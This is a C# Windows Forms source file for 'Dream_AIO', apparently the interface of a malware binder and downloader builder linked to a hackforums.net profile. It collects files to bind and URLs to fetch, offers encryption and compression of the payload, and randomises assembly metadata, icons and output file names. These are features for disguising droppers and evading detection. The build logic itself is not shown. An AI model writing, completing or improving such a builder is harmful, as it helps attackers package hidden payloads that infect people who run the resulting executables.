using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Dream_AIO
{
    public partial class Form1 : Form
    {

        private Builder Builder = new Builder();
        private Logger Logger = new Logger();

        public Form1()
        {
            InitializeComponent();
            RandomizeAssembly();
            Logger.OnLog += Logger_OnLog;
            Builder.Logger = Logger;
        }

        private void Logger_OnLog(Logger sender, byte kind, DateTime dateTime, string text)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new MethodInvoker(() => { Logger_OnLog(sender, kind, dateTime, text); }));
                return;
            }

            ListViewItem item = new ListViewItem(new string[] { dateTime.ToShortTimeString(), text });

            item.ImageIndex = kind;

            nativeListView1.SuspendLayout();
            nativeListView1.Items.Add(item);
            item.EnsureVisible();
            nativeListView1.ResumeLayout();
        }

        private ListViewItem GetSelectedItem(NativeListView listView)
        {
            if (listView.SelectedItems.Count == 0)
            {
                return null;
            }
            return listView.SelectedItems[0];
        }

        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            BinderDialog bd = new BinderDialog();


            if (bd.ShowDialog() == DialogResult.OK)
            {
                Icon ico = Icon.ExtractAssociatedIcon(bd.FileName);
                ListViewItem item = new ListViewItem();
                binderImageList.Images.Add(bd.FileName, ico);
                item.ImageKey = bd.FileName;
                item.Text = Path.GetFileName(bd.FileName);
                item.Tag = bd;
                binderList.Items.Add(item);
            }


            //using(OpenFileDialog ofd = new OpenFileDialog())
            //{
            //    if(ofd.ShowDialog() == DialogResult.OK)
            //    {
            //        Icon ico = Icon.ExtractAssociatedIcon(ofd.FileName);
            //        ListViewItem item = new ListViewItem();
            //        binderImageList.Images.Add(ofd.FileName,ico);
            //        item.ImageKey = ofd.FileName;
            //        item.Text = Path.GetFileName(ofd.FileName);
            //        binderList.Items.Add(item);
            //    }
            //}
        }

        private void editToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = GetSelectedItem(binderList);
            if (item == null) return;

            BinderDialog bd = (BinderDialog)item.Tag;

            if (bd.ShowDialog() == DialogResult.OK)
            {
                                if (!binderImageList.Images.ContainsKey(bd.FileName))
                {
                    Icon ico = Icon.ExtractAssociatedIcon(bd.FileName);
                    binderImageList.Images.Add(bd.FileName, ico);
                }

                item.ImageKey = bd.FileName;
                item.Text = Path.GetFileName(bd.FileName);
            }

        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = GetSelectedItem(binderList);
            if (item == null) return;

            BinderDialog bd = (BinderDialog)item.Tag;
            bd.Dispose();
            binderList.Items.Remove(item);

        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = GetSelectedItem(downloaderList);
            if (item == null) return;

            DownloaderDialog bd = (DownloaderDialog)item.Tag;
            bd.Dispose();
            downloaderList.Items.Remove(item);
        }

        private void addToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            DownloaderDialog bd = new DownloaderDialog();


            if (bd.ShowDialog() == DialogResult.OK)
            {
               // Icon ico = Icon.ExtractAssociatedIcon(bd.FileName);
                ListViewItem item = new ListViewItem();
              //  binderImageList.Images.Add(bd.FileName, ico);
                //item.ImageKey = bd.FileName;
                item.Text = bd.Url;
                item.Tag = bd;
                downloaderList.Items.Add(item);
            }

        }

        private void editToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ListViewItem item = GetSelectedItem(downloaderList);
            if (item == null) return;

            DownloaderDialog bd = (DownloaderDialog)item.Tag;

            if (bd.ShowDialog() == DialogResult.OK)
            {
               

                item.Text = bd.Url;
            }

        }

        private SettingsFile GetSettings()
        {
            SettingsFile sf = new SettingsFile();

            sf.EncryptFiles = checkBox2.Checked;
            sf.CompressFiles = checkBox1.Checked;

            sf.BindFiles = new List<BinderSetting>();

            foreach(ListViewItem itm in binderList.Items)
            {
                BinderDialog bd = (BinderDialog)itm.Tag;

                sf.BindFiles.Add(bd.GetSettings());
            }

            sf.DownloadFiles = new List<DownloaderSetting>();

            foreach (ListViewItem itm in downloaderList.Items)
            {
                DownloaderDialog bd = (DownloaderDialog)itm.Tag;

                sf.DownloadFiles.Add(bd.GetSettings());
            }


            sf.AssemblyDescription = asmDescriptionText.Text;
            sf.AssemblyCopyright = asmCopyrightText.Text;
            sf.AssemblyCompany = asmCompanyText.Text;
            sf.AssemblyProductName = asmProductNameText.Text;
            sf.AssemblyVersion = asmVersionText.Text;

            sf.IconPath = iconText.Text;

            return sf;
        }


        private void button1_Click(object sender, EventArgs e)
        {
            SettingsFile sf = GetSettings();
            using(SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Filter = "Application (.exe)|*.exe";
                sfd.FileName = string.Format("{0}.exe", WordGen.GenWord(5));
                if(sfd.ShowDialog() == DialogResult.OK)
                {
                    new Thread(new ThreadStart(() => { Builder.Build(sf, sfd.FileName); })).Start();
                }
            }
           
        }

        private void button4_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Icon (.ico)|*.ico";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    iconText.Text = ofd.FileName;
                    pictureBox1.ImageLocation = ofd.FileName;
                }
            }
        }

        private void RandomizeAssembly()
        {
            asmDescriptionText.Text = WordGen.GenWord(10);
            asmProductNameText.Text = string.Format("{0}", WordGen.GenWord(2));
            asmCopyrightText.Text = string.Format("{0} © {1}", WordGen.GenWord(2), WordGen.GenWord(2));
            asmCompanyText.Text = WordGen.GenWord(5);
            asmVersionText.Text = string.Format("{0}.{1}.{2}.{3}", WordGen.R.Next(1, 20), WordGen.R.Next(0, 30), WordGen.R.Next(0, 99), WordGen.R.Next(0, 99));
        }

        private void button5_Click(object sender, EventArgs e)
        {
            RandomizeAssembly();
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            Process.Start("https://hackforums.net/member.php?action=profile&uid=3609589");
        }
    }
}
